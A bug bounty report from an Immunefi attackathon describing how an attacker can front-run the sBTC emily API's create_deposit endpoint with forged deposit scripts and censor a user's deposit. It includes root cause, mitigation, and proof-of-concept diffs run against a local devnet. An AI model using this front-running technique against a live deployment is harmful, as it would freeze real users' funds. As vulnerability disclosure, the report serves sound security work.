# #37384 \[BC-Medium] Attacker can front-run call to emily api with incorrect data, preventing legit us

**Submitted on Dec 3rd 2024 at 16:26:12 UTC by @n4nika for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #37384
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/emily>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Summary

An attacker can "front-run" legitimate users' requests to `create_deposit` of the `emily` api (`emily/handler/src/api/handlers/deposit.rs#206`) with malformed deposit requests, censoring those users' deposits.

## Rootcause

Since the `create_deposit` endpoint of the `emily` api (`emily/handler/src/api/handlers/deposit.rs#206`) does not do any verification that the submitted scripts match the scripts at the submitted `bitcoin_txid[bitcoin_tx_output_index]`, meaning we can specify arbitrary scripts which do not match the actual bitcoin transaction. If we manage to make such a request to `emily` before the legitimate user does, their deposit request will not be accepted and since our request is malformed, it will fail the signer verification later on.

## Impact

Now if we manage to fit our malicious request in before the user's goes through, their deposit request will fail. As far as I can see (please correct me if I'm wrong), the `deposit_entry` added to the database [here](https://github.com/stacks-network/sbtc/blob/53cc756c0ddecff7518534a69bef59fadb5ab1d4/emily/handler/src/api/handlers/deposit.rs#L257) is never removed from it later. Since the key for the database entry is based on the `txid` and `tx_output_index` (seen [here](https://github.com/stacks-network/sbtc/blob/53cc756c0ddecff7518534a69bef59fadb5ab1d4/emily/handler/src/api/handlers/deposit.rs#L231-L234)), the legit user will be unable to re-submit their deposit request.

Therefore this allows the attacker to censor the user's deposit, essentially freezing their assets for the user specified `lock_time`.

## Mitigation

Consider already checking whether the deposit request sent to `emily` is legit (cross-check the claimed information with the information written in the specified bitcoin transaction).

## Proof of Concept

In order to run the PoC, please apply the following two diffs (one updates the `demo_cli`, the other updates the `signers.sh` script):

```diff
diff --git a/signer/src/bin/demo_cli.rs b/signer/src/bin/demo_cli.rs
index 73c4df02..c3a2f77e 100644
--- a/signer/src/bin/demo_cli.rs
+++ b/signer/src/bin/demo_cli.rs
@@ -13,6 +13,7 @@ use clarity::{
     types::{chainstate::StacksAddress, Address as _},
     vm::types::{PrincipalData, StandardPrincipalData},
 };
+use emily_client::models::{deposit, Deposit, Status};
 use emily_client::{
     apis::{
         configuration::{ApiKey, Configuration},
@@ -21,6 +22,7 @@ use emily_client::{
     models::CreateDepositRequestBody,
 };
 use fake::Fake as _;
+use libp2p::identify::Info;
 use rand::rngs::OsRng;
 use sbtc::deposits::{DepositScriptInputs, ReclaimScriptInputs};
 use secp256k1::PublicKey;
@@ -28,6 +30,7 @@ use signer::config::Settings;
 use signer::keys::SignerScriptPubKey;
 use signer::storage::model::StacksPrincipal;
 
+
 #[derive(Debug, thiserror::Error)]
 #[allow(clippy::enum_variant_names)]
 enum Error {
@@ -61,8 +64,15 @@ struct CliArgs {
 enum CliCommand {
     /// Simulate a deposit request
     Deposit(DepositArgs),
+    BitcoinTx(DepositArgs),
+    DepositEmily(DepositArgs),
     Donation(DonationArgs),
     Info(InfoArgs),
+    GetDeposits(GetArgs),
+}
+
+#[derive(Debug, Args)]
+struct GetArgs {
 }
 
 #[derive(Debug, Args)]
@@ -83,6 +93,9 @@ struct DepositArgs {
     /// The public key of the aggregate signer.
     #[clap(long = "signer-key")]
     signer_aggregate_key: String,
+
+    #[clap(long)]
+    tx_id: String,
 }
 
 #[derive(Debug, Args)]
@@ -156,8 +169,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         CliCommand::Deposit(args) => {
             exec_deposit(args, &bitcoin_client, &emily_client_config).await?
         }
+        CliCommand::BitcoinTx(args) => {
+            exec_bitcoin_tx(args, &bitcoin_client, &emily_client_config).await?
+        }
+        CliCommand::DepositEmily(args) => {
+            exec_deposit_emily(args, &bitcoin_client, &emily_client_config).await?
+        }
         CliCommand::Donation(args) => exec_donation(args, &bitcoin_client).await?,
         CliCommand::Info(args) => exec_info(args).await?,
+        CliCommand::GetDeposits(args) => exec_get_deposits(args, &emily_client_config).await?,
     }
 
     Ok(())
@@ -194,6 +214,77 @@ async fn exec_deposit(
     Ok(())
 }
 
+async fn exec_get_deposits(
+    args: GetArgs,
+    emily_config: &Configuration,
+) -> Result<(), Error> {
+
+    let emily_deposit = deposit_api::get_deposits(
+        emily_config,
+        Status::Pending,
+        None,
+        None,
+    )
+    .await.unwrap();
+
+    println!("Deposit request created: {:?}", emily_deposit);
+    Ok(())
+}
+
+
+async fn exec_bitcoin_tx(
+    args: DepositArgs,
+    bitcoin_client: &Client,
+    emily_config: &Configuration,
+) -> Result<(), Error> {
+    let (unsigned_tx, deposit_script, reclaim_script) =
+        create_bitcoin_deposit_transaction(bitcoin_client, &args)?;
+
+    let txid = unsigned_tx.compute_txid();
+
+    let signed_tx = bitcoin_client.sign_raw_transaction_with_wallet(&unsigned_tx, None, None)?;
+    println!("Signed transaction: {:?}", hex::encode(&signed_tx.hex));
+    let tx = bitcoin_client.send_raw_transaction(&signed_tx.hex)?;
+    println!("Transaction sent: calculated txid {txid:?}, actual txid {tx:?}");
+
+    Ok(())
+}
+
+async fn exec_deposit_emily(
+    args: DepositArgs,
+    bitcoin_client: &Client,
+    emily_config: &Configuration,
+) -> Result<(), Error> {
+    let (unsigned_tx, deposit_script, reclaim_script) =
+        create_bitcoin_deposit_transaction(bitcoin_client, &args)?;
+
+    let txid = bitcoin::Txid::from_str(args.tx_id.as_str()).unwrap();
+
+    let mut deposit_script = deposit_script;
+    println!("Before");
+    deposit_script.signers_public_key = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
+    .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
+    .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;
+
+    println!("After");
+
+    let emily_deposit = deposit_api::create_deposit(
+        emily_config,
+        CreateDepositRequestBody {
+            bitcoin_tx_output_index: 0,
+            bitcoin_txid: txid.to_string(),
+            deposit_script: deposit_script.deposit_script().to_hex_string(),
+            reclaim_script: reclaim_script.reclaim_script().to_hex_string(),
+        },
+    )
+    .await?;
+
+    println!("Deposit request created: {:?}", emily_deposit);
+
+    Ok(())
+}
+
+
 async fn exec_donation(args: DonationArgs, bitcoin_client: &Client) -> Result<(), Error> {
     let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
         .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))

```

```diff
diff --git a/signers.sh b/signers.sh
index 1b842264..621ec683 100755
--- a/signers.sh
+++ b/signers.sh
@@ -79,24 +79,77 @@ exec_run() {
 exec_demo() {
   if [ -z "$1" ]; then
     pubkey=$(psql postgresql://postgres:postgres@localhost:5432/signer -c "SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1" --no-align --quiet --tuples-only)
-    pubkey=$(echo "$pubkey" | cut -c 2-)
+    pubkey=$(echo "$pubkey" | cut -c 3-)
     echo "Signers aggregate_key: $pubkey"
   else
     pubkey="$1"
   fi
 
   cargo run -p signer --bin demo-cli donation --amount 2000000 --signer-key "$pubkey"
-  cargo run -p signer --bin demo-cli deposit --amount 42 --max-fee 20000 --lock-time 50 --stacks-addr ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039 --signer-key "$pubkey"
+  cargo run -p signer --bin demo-cli deposit --amount 42 --max-fee 20000 --lock-time 50 --stacks-addr ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039 --signer-key "$pubkey" --tx-id ""
+}
+
+exec_poc() {
+  if [ -z "$1" ]; then
+    pubkey=$(psql postgresql://postgres:postgres@localhost:5432/signer -c "SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1" --no-align --quiet --tuples-only)
+    pubkey=$(echo "$pubkey" | cut -c 3-)
+    echo "Signers aggregate_key: $pubkey"
+  else
+    pubkey="$1"
+  fi
+
+  cargo run -p signer --bin demo-cli donation --amount 2000000 --signer-key "$pubkey"
+
+  cargo run -p signer --bin demo-cli bitcoin-tx --amount 42 --max-fee 20000 --lock-time 50 --stacks-addr ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039 --signer-key "$pubkey" --tx-id ""
+}
+
+exec_second_stage() {
+  if [ -z "$1" ]; then
+    pubkey=$(psql postgresql://postgres:postgres@localhost:5432/signer -c "SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1" --no-align --quiet --tuples-only)
+    pubkey=$(echo "$pubkey" | cut -c 3-)
+    echo "Signers aggregate_key: $pubkey"
+  else
+    pubkey="$1"
+  fi
+
+  if [ -z "$2" ]; then
+    txid=""
+  else
+    txid="$2"
+  fi
+
+  # txid="$2"
+
+  if [ -z "$3" ]; then
+    stacks=ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039
+  else
+    stacks="$3"
+  fi
+
+
+  echo "-----------"
+  echo $pubkey
+  echo $txid
+  echo $stacks
+  echo "-----------"
+
+  cargo run -p signer --bin demo-cli deposit-emily --amount 42 --max-fee 20000 --lock-time 50 --stacks-addr $stacks --signer-key "$pubkey" --tx-id "$txid"
+}
+
+exec_get_deposits() {
+
+  cargo run -p signer --bin demo-cli get-deposits
+
 }
 
 exec_info() {
   pubkey=$(psql postgresql://postgres:postgres@localhost:5432/signer -c "SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1" --no-align --quiet --tuples-only)
-  pubkey=$(echo "$pubkey" | cut -c 2-)
+  pubkey=$(echo "$pubkey" | cut -c 3-)
   echo "Signers aggregate_key: $pubkey"
 
   cargo run -p signer --bin demo-cli info --signer-key "$pubkey"
-}
 
+}
 # The main function
 main() {
   if [ "$#" -eq 0 ]; then
@@ -116,6 +169,21 @@ main() {
       shift # Shift the command off the argument list
       exec_demo "$@"
       ;;
+    # Execute PoC
+    "poc")
+      shift # Shift the command off the argument list
+      exec_poc "$@"
+      ;;
+    # Execute PoC s2
+    "s2")
+      shift # Shift the command off the argument list
+      exec_second_stage "$1" "$2" "$3"
+      ;;
+    # Get deposits
+    "get")
+      shift # Shift the command off the argument list
+      exec_get_deposits "$@"
+      ;;
     # Get signers info from db
     "info")
       shift # Shift the command off the argument list

```

After that, this can be confirmed by:

1. launching the devnet
2. executing `./signers.sh poc` and taking the returned `TXID`
3. executing `./signers.sh s2 [SIGNER_KEY] [TXID] SP2QKVPXG87TZ01JMRH1VP3S38AWN32NBS5B4CWT0`, here `SIGNER_KEY` can be taken from the cargo run output of the previous command (sorry the script is a bit hacky)
   1. The last argument is a random stacks address I took from the stacks explorer
   2. This step is the "frontrun" of the attacker, providing a `recipient` which does not match the one of the bitcoin transaction on-chain
4. executing `./signers.sh get` -> this returns the current deposit requests; here we can see that the recipient is the one we provided
5. If we now execute `./signers.sh s2 [SIGNER_KEY] [TXID]` (which defaults to using the recipient of the on-chain transaction)
6. and afterwards again execute `./signers.sh get`, we see that now the recipient was not updated (which is good, otherwise we would have another bug)

Since all these steps work, this shows that we can submit an invalid deposit request for a valid transaction. That this later on fails should be pretty clear; we verify the script integrity in the `sbtc` library before signers sign the deposit [here](https://github.com/stacks-network/sbtc/blob/53cc756c0ddecff7518534a69bef59fadb5ab1d4/sbtc/src/deposits.rs#L157-L159)
